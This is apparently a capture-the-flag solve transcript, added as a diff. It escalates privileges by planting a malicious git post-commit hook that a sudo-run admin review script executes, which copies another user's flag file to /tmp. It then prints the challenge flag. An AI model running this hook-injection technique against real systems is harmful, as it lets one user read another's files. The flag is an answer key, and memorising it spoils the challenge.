@@ -1,0 +1,40 @@
+intern@neverland:~$ git clone /app myrepo
+Cloning into 'myrepo'...
+done.
+
+
+intern@neverland:~$ cd myrepo/.git/hooks
+intern@neverland:~/myrepo/.git/hooks$ cat << 'EOF' > post-commit
+#!/bin/bash
+cat /home/peter/flag.txt > /tmp/flag.txt
+chmod 777 /tmp/flag.txt
+EOF
+intern@neverland:~/myrepo/.git/hooks$ chmod +x post-commit 
+
+intern@neverland:~$ cp /app/.git/config myrepo/.git/config
+
+
+intern@neverland:~$ tar -czf exploit.tar.gz myrepo
+
+intern@neverland:~$ sudo -u peter /opt/commit.sh exploit.tar.gz
+[ADMIN GIT COMMIT] Received submission: exploit.tar.gz
+[ADMIN GIT COMMIT] Extracting archive to temporary directory: /home/peter/git-review-263
+[ADMIN GIT COMMIT] Changed directory to /home/peter/git-review-263/myrepo
+[ADMIN GIT COMMIT] Verifying that your repository is up-to-date...
+[ADMIN GIT COMMIT] Admin's latest commit: 2a6077c221c2fe4a89e6190c1cf8d00e19da66dc
+[ADMIN GIT COMMIT] Your latest commit:    2a6077c221c2fe4a89e6190c1cf8d00e19da66dc
+[ADMIN GIT COMMIT] SUCCESS: Commit history matches.
+[ADMIN GIT COMMIT] Verifying integrity of .git/config file...
+[ADMIN GIT COMMIT] Admin's .git/config hash: cfe7ba1238c9a78be7535d7c63bcaf5a4d5011d46b07c9b45d3bbf7d6c312dfe
+[ADMIN GIT COMMIT] Your .git/config hash:    cfe7ba1238c9a78be7535d7c63bcaf5a4d5011d46b07c9b45d3bbf7d6c312dfe
+[ADMIN GIT COMMIT] SUCCESS: .git/config is valid. Proceeding with review.
+[ADMIN GIT COMMIT] Reviewing your proposed changes...
+--------------------------------------------------
+On branch master
+nothing to commit, working tree clean
+--------------------------------------------------
+[ADMIN GIT COMMIT] Everything looks good. Adding your changes to the staging area.
+[ADMIN GIT COMMIT] Committing your changes to the official branch. Stand by...
+
+intern@neverland:~$ cat /tmp/flag.txt 
+Hero{c4r3full_w1th_g1t_hO0k5_d4dcefb250aa8c2ffabaa57119e3bc42}
